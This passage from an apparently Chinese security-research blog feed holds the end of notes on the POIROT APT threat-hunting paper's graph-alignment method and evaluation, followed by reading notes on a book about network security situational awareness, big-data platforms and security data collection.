style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>，计算该节点到其它<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的候选节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span>的最大influence score之和，其中候选节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span>满足：1）从k可达或者可以到达k；2）在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span>相对应的aligned node <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>，同样有路径可以连通。</p><p>如在Fig.3中，我们分别对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>o</mi><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">firefox_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>o</mi><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">firefox_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>进行上述过程，然后选出具有最大贡献值的alignment。贡献如下计算：</p><p><img src="https://img-blog.csdnimg.cn/20200325201803609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mn>1</mn><mrow><mi>j</mi><mo>:</mo><mi>l</mi></mrow></msub></mrow><annotation encoding="application/x-tex">1_{j:l}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">:</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>是指示函数，当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>j</mi><mo>:</mo><mi>l</mi></mrow><annotation encoding="application/x-tex">j:l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span>已经被固定时，其值为1，反之为0。注意<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mn>1</mn><mrow><mi>j</mi><mo>:</mo><mi>l</mi></mrow></msub></mrow><annotation encoding="application/x-tex">1_{j:l}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">:</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msub><mn>1</mn><mrow><mi>j</mi><mo>:</mo><mi>l</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1-1_{j:l})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">:</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>是互斥的。</p><p>经过了Step 3的处理之后，每个节点 i 都有K个候选alignment，而selection function固定了 i 的alignment node：</p><p><img src="https://img-blog.csdnimg.cn/2020032520184048.png#pic_center" alt="" /></p><p>最终，在固定了所有的alignment node之后，采用等式（2）计算alignment score，如果低于阈值，那么重复执行Step2-4.</p><h1 id="6-评估"><a class="markdownIt-Anchor" href="#6-评估"></a> 6 评估</h1><p>用三个实验进行评估：</p><ul><li>DARPA Transparent Computing</li><li>real-world incidents</li><li>attack-free dataset</li></ul><p>所有实验中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mrow><mi>t</mi><mi>h</mi><mi>r</mi></mrow></msub></mrow><annotation encoding="application/x-tex">C_{thr}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>定义为3，因此阈值为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><mn>3</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>,</p><h2 id="61-darpa-tc"><a class="markdownIt-Anchor" href="#61-darpa-tc"></a> 6.1 DARPA TC</h2><p>红队依靠威胁描述来展开攻击。本文获取到这些威胁描述，并使用他们来提取query graph。（实际场景下能获取到威胁描述？？ ）</p><p><img src="https://img-blog.csdnimg.cn/2020032520190633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><p>下图展示了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中每个节点对应的候选节点数量的分布情况：</p><p><img src="https://img-blog.csdnimg.cn/20200325201919210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><p>下图展示了每个场景的Graph Alignment Scores：</p><p><img src="https://img-blog.csdnimg.cn/20200325201931617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><h2 id="62-public-attacks"><a class="markdownIt-Anchor" href="#62-public-attacks"></a> 6.2 Public Attacks</h2><p>采用了如下公开的恶意样本，并对比了三种不同的检测工具。</p><p><img src="https://img-blog.csdnimg.cn/2020032520195264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><p>其他方法是基于基于哈希签名检测。但当攻击者独立使用一些强大的IOC，弱化事件之间的关联性时，POIROT的效果就没有那么好。</p><h2 id="63-benign-datasets"><a class="markdownIt-Anchor" href="#63-benign-datasets"></a> 6.3 Benign Datasets</h2><p>为了测试POIROT产生误报的情况，我们使用DARPA TC中生成的良性数据集，以及我们监测了一个月的四台机器（客户端，SSH服务器，邮件服务器和Web服务器）。</p><p>通过衡量F-score确定阈值。</p><h2 id="64-效率"><a class="markdownIt-Anchor" href="#64-效率"></a> 6.4 效率</h2><p>使用Apache benchmark、JetStream、HDTune来衡量</p><p><img src="https://img-blog.csdnimg.cn/20200325202004874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><h1 id="7-启发"><a class="markdownIt-Anchor" href="#7-启发"></a> 7 启发</h1><ul><li><p>如何将DARPA TC数据分为benign和attack</p></li><li><p>构建Query Graph所需要的先验知识较多。在实际场景下，很难获取与正在进行的APT恰好对应的IOC</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
            <tag> APT </tag>
            
            <tag> 威胁猎杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《网络安全态势感知》读书笔记</title>
      <link href="/2020/03/19/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/19/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>本书涉及面较广，但是白话较多，没有太多的干货。寸之深，亩只阔，适合作为科普读物快速阅读。</p><h1 id="i-基础知识"><a class="markdownIt-Anchor" href="#i-基础知识"></a> Ⅰ 基础知识</h1><h1 id="1-开启网络安全态势感知的旅程"><a class="markdownIt-Anchor" href="#1-开启网络安全态势感知的旅程"></a> 1 开启网络安全态势感知的旅程</h1><p>（1）网络安全态势感知本质上就是获取并理解大量网络安全数据，判断当前整体安全状态并预测短期未来趋势。总体而言可分为三个阶段：<kbd>态势提取、态势理解和态势预测</kbd>，三个部分同步并行，相互触发连续的变化，不断更新和往复循环。</p><p>（2）防火墙的实质：根据包的起点和终点来判断是否允许其通过</p><p>（3）IDS分类：</p><ul><li>根据信息来源不同分为：基于主机、基于网络和分布式IDS</li><li>根据检测方法和安全策略，分为：<ul><li>异常入侵检测：建立正常行为模型，漏报低，误报高</li><li>误用入侵检测：建立不可接受的行为模型，漏报高，误报低</li></ul></li></ul><p>（4）获取较低抽象层次的网络安全态势的方法：入侵检测与告警关联、使用攻击图进行漏洞分析、因果关联分析、取证分析（入侵的反向追踪）、信息流分析、攻击趋势分析和入侵响应。</p><p>（5）JDL的数据融合模型、Bass的功能模型</p><p>（6）<strong>数据融合</strong>是网络安全态势理解的核心</p><p>（7）当前的网络安全态势预测方法：神经网络、时间序列预测法、SVM、基于因果的数据模型、模式识别</p><p>（8）目标：降低MTTD/MTTR（平均检测时间/平均响应时间）</p><h1 id="2-大数据平台和技术"><a class="markdownIt-Anchor" href="#2-大数据平台和技术"></a> 2 大数据平台和技术</h1><ul><li>大数据特点：Volume（大量）、Velocity（高速）、Variety（多样）、Value（低价值密度）</li></ul><h2 id="21-大数据基础"><a class="markdownIt-Anchor" href="#21-大数据基础"></a> 2.1 大数据基础</h2><h3 id="211-大数据关键技术"><a class="markdownIt-Anchor" href="#211-大数据关键技术"></a> 2.1.1 大数据关键技术</h3><ul><li>数据采集与预处理</li><li>数据存储与管理</li><li>数据处理与分析</li><li>数据可视化呈现</li></ul><h3 id="212-大数据计算模式"><a class="markdownIt-Anchor" href="#212-大数据计算模式"></a> 2.1.2 大数据计算模式</h3><ul><li>批处理计算：传统的计算方式，如MapReduce、Spark</li><li>流式计算：实时处理多源、连续到达的流式数据</li><li>交互式查询计算：用于对超大规模数据的存储管理和查询分析</li><li>图计算：以“图论”为基础，用于对大规模图结构数据的处理</li></ul><h2 id="22-大数据主流平台框架"><a class="markdownIt-Anchor" href="#22-大数据主流平台框架"></a> 2.2 大数据主流平台框架</h2><h3 id="221-hadoop"><a class="markdownIt-Anchor" href="#221-hadoop"></a> 2.2.1 Hadoop</h3><p><img src="https://img-blog.csdnimg.cn/20200319153807119.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><ul><li>采用Java开发的开源分布式计算平台，<strong>用大量廉价计算机集群进行分布式存储计算</strong>，具有良好的跨平台性，<strong>主要用于批处理计算</strong>。</li><li>优点：高可靠性、高效性、低成本、可扩展性、支持多种编程语言</li><li>缺点：计算过程放在硬盘上，速度不如使用内存快</li><li>采用MapReduce计算模型</li></ul><h3 id="222-spark"><a class="markdownIt-Anchor" href="#222-spark"></a> 2.2.2 Spark</h3><ul><li>Scala语言编写，提供了<strong>内存计算</strong>，用于对大规模数据的<strong>快速处理</strong></li><li>兼容Hadoop</li><li>优点：速度快、<strong>通用性（支持4种计算模式）</strong>、易用性、运行模式多样</li></ul><h3 id="223-storm"><a class="markdownIt-Anchor" href="#223-storm"></a> 2.2.3 Storm</h3><ul><li>主要用于<strong>实时的流式数据处理</strong></li><li>优点：整合性（可以方便地和消息队列系统、数据库进行整合）、可扩展性、简易的API、可靠的消息处理、容错性、支持多种编程语言</li></ul><p>由于安全场景<strong>复杂批量数据处理</strong>和<strong>基于历史数据</strong>的交互式查询以及数据挖掘，对<strong>实时流式数据</strong>处理也有一部分需求，因此适合使用<strong>Hadoop+Spark</strong>相结合的建设模式。</p><h2 id="23-网络安全态势感知架构"><a class="markdownIt-Anchor" href="#23-网络安全态势感知架构"></a> 2.3 网络安全态势感知架构</h2><p><img src="https://img-blog.csdnimg.cn/20200319153823678.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="24-大数据采集与预处理技术"><a class="markdownIt-Anchor" href="#24-大数据采集与预处理技术"></a> 2.4 大数据采集与预处理技术</h2><p>（1）数据分类</p><ul><li>按照形态分类分类：结构化数据和非结构化数据</li><li>按照应用场景计算需求分类：静态数据和动态数据（流式数据，随时间而无限增长）</li><li>按照来源和特点分类：环境业务类数据、网络层面数据、主机层面日志数据、告警数据</li></ul><p>（2）数据采集方法：</p><ul><li>传感器：  软件或硬件“探针”</li><li>网络爬虫</li><li>日志收集系统：Flume</li><li>数据抽取工具：将存储在数据库中的结构化数据抽取到Hadoop中；Sqoop</li><li>分布式<strong>消息队列</strong>系统：在消息传输过程中保存消息的容器或中间件，提供消息路由、数据分发和可靠传递；<kbd>Kafka</kbd></li></ul><h2 id="25-大数据存储与管理技术"><a class="markdownIt-Anchor" href="#25-大数据存储与管理技术"></a> 2.5 大数据存储与管理技术</h2><ul><li>分布式文件系统 ：GFS、HDFS</li><li>分布式数据库：HBase</li><li>分布式协调系统：主要用来解决分布式环境当中多个进程之间的相互控制；使用分布式锁；ZooKeeper</li><li>非关系型数据库：NoSQL</li><li>资源管理调度： YARN、Mesos</li></ul><h2 id="26-大数据处理与分析技术"><a class="markdownIt-Anchor" href="#26-大数据处理与分析技术"></a> 2.6 大数据处理与分析技术</h2><ul><li>批量数据处理：MapReduce</li></ul><p><img src="https://img-blog.csdnimg.cn/20200319153834690.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><ul><li><p>交互式数据分析：Hive</p></li><li><p>流式计算：Storm、Spark Streaming；前者实时程度高，后者采用小批量处理方式可以兼顾批量和实时处理</p></li><li><p>图计算：Pregel</p></li><li><p>高级数据查询语言Pig：一种脚本语言，会自动把用户编写的脚本转换成MapReduce作业并在Hadoop运行</p></li></ul><h2 id="27-大数据可视化技术"><a class="markdownIt-Anchor" href="#27-大数据可视化技术"></a> 2.7 大数据可视化技术</h2><p>（1）工具</p><ul><li>R</li><li>Weka</li><li>Gephi</li></ul><h1 id="ii-态势提取"><a class="markdownIt-Anchor" href="#ii-态势提取"></a> Ⅱ 态势提取</h1><h1 id="3-网络安全数据范围"><a class="markdownIt-Anchor" href="#3-网络安全数据范围"></a> 3 网络安全数据范围</h1><h2 id="31-完整内容数据"><a class="markdownIt-Anchor" href="#31-完整内容数据"></a> 3.1 完整内容数据</h2><ul><li>主要是指包捕获数据；Wireshark</li></ul><p>数据包分析：</p><ul><li>包过滤</li><li>模式匹配</li><li>协议字段分析</li></ul><h2 id="32-提取内容数据"><a class="markdownIt-Anchor" href="#32-提取内容数据"></a> 3.2 提取内容数据</h2><ul><li>包字符串数据：例如我们可以提取HTTP数据包的报头或者有效载荷</li></ul><h2 id="33-会话数据"><a class="markdownIt-Anchor" href="#33-会话数据"></a> 3.3 会话数据</h2><p>会话数据是两个网络设备之间通信行为的汇总，也称为数据流。其定义是一系列通过网络中某一观察点的具有相同属性的数据包，这些属性包括：会话的起点和重点、会话为单向或双向、数据包发送的起止时间、协议层次等。</p><ul><li>会话数据常见的标准是五元数据组：源IP、源端口、目的IP、目的端口、传输协议。</li><li>常见类型：NetFlow、IPFIX</li></ul><h2 id="34-统计数据"><a class="markdownIt-Anchor" href="#34-统计数据"></a> 3.4 统计数据</h2><p>对其他数据类型的组织、分析、解释和演示。</p><h2 id="35-元数据"><a class="markdownIt-Anchor" href="#35-元数据"></a> 3.5 元数据</h2><p>元数据（Metadata）是<strong>用于描述数据的数据</strong>，主要是描述数据属性的信息，如数据的组织、数据域及其关系。</p><ul><li>为了获取元数据，我们从网络环境中提取关键元素，然后利用外部工具来理解他们。如我们想知道在数据包中的源和目的IP是谁在管理，如何组织起来的，那么我们就可以使用WHOIS数据库进行查询，获得元数据。</li></ul><h2 id="36-日志数据"><a class="markdownIt-Anchor" href="#36-日志数据"></a> 3.6 日志数据</h2><p>非常重要和有价值的网络安全数据类型，特别是当其被存储在一个中央服务器上并且有多个日志来源相关联的时候。日志数据记录着特定的事件、特定系统和环境的状态。</p><ul><li>主要包括：Web代理日志、防火墙日志、VPN身份验证日志、Windows安全日志、SysLog数据等</li><li>根据来源分类：物理设备日志（IOT）、网络设备日志、操作系统日志、应用程序日志</li><li>根绝记录架构分类：本地日志、远程分散日志、集中管理日志</li></ul><h2 id="37-告警数据"><a class="markdownIt-Anchor" href="#37-告警数据"></a> 3.7 告警数据</h2><ul><li>入侵检测系统是告警数据的重要来源</li></ul><h1 id="4-网络安全数据采集"><a class="markdownIt-Anchor" href="#4-网络安全数据采集"></a> 4 网络安全数据采集</h1><h2 id="41-制定数据采集计划"><a class="markdownIt-Anchor" href="#41-制定数据采集计划"></a> 4.1 制定数据采集计划</h2><p>四个阶段：</p><ul><li>定义威胁：STRIDE威胁建模、攻击树、攻击库等</li><li>量化风险：风险评估，即面临的风险、存在的弱点、造成的影响。常用“影响”和“概率”的乘积来求得影响值。“影响”表示威胁对组织造成的影响，可以分级度量；“概率”表示威胁发生的可能性。</li><li>识别数据源</li><li>提炼有价值元素</li></ul><h2 id="42-主动式采集"><a class="markdownIt-Anchor" href="#42-主动式采集"></a> 4.2 主动式采集</h2><p>也称为交互式采集，是指通过与网络上工作的主机进行交互操作的方式来采集网络数据。</p><ul><li>SNMP</li><li>Telnet</li><li>SSH</li><li>WMI（Windows Management Instrumentation，Windows管理规范）</li><li>文件传输协议：FTP、SFTP、TFTP、HTTP、HTTPS</li><li>JDBC/ODBC采集数据库信息：为多种数据库提供统一访问</li><li>代理和插件</li><li>漏洞、端口扫描</li><li>蜜罐和蜜网</li><li>爬虫和传感器</li></ul><h2 id="43-被动式采集"><a class="markdownIt-Anchor" href="#43-被动式采集"></a> 4.3 被动式采集</h2><p>是指在网络上采集数据时，不发出第二层或更高层的数据。</p><ul><li>有线和无线：监听网线、无线电波数据</li><li>集线器和交换机：集线器的广播特性、交换机端口镜像将某几个端口的流量复制到其它端口上</li><li>Syslog：广泛应用于Unix类的网络设备中</li><li>SNMP Trap：SNMP代理主动发送数据</li><li>NetFlow、IPFIX、sFlow：会话、数据流交换技术</li><li>WebService、MQ（消息队列）</li><li>DPI、DFI：深度包、流检测</li></ul><h2 id="44-数据采集工具"><a class="markdownIt-Anchor" href="#44-数据采集工具"></a> 4.4 数据采集工具</h2><p><img src="https://img-blog.csdnimg.cn/2020031915385511.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br /><img src="https://img-blog.csdnimg.cn/20200319153907378.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="45-采集点部署"><a class="markdownIt-Anchor" href="#45-采集点部署"></a> 4.5 采集点部署</h2><p>需要考虑的因素：降低数据冗余、时间同步、采集覆盖面要兼顾边界和内部网络、衡量采集成本的收益、考虑存储空间</p><ul><li>关注网络出入口点</li><li>掌握IP地址分布</li><li>靠近关键资产</li><li>创建采集全景视图</li></ul><h1 id="5-网络安全数据预处理"><a class="markdownIt-Anchor" href="#5-网络安全数据预处理"></a> 5 网络安全数据预处理</h1><p>数据预处理的主要内容包括：</p><ul><li>数据审核：审核准确性、适用性、及时性、一致性</li><li>数据筛选</li><li>数据排序</li></ul><p>主要方法包括以下几种：</p><h2 id="51-数据清洗"><a class="markdownIt-Anchor" href="#51-数据清洗"></a> 5.1 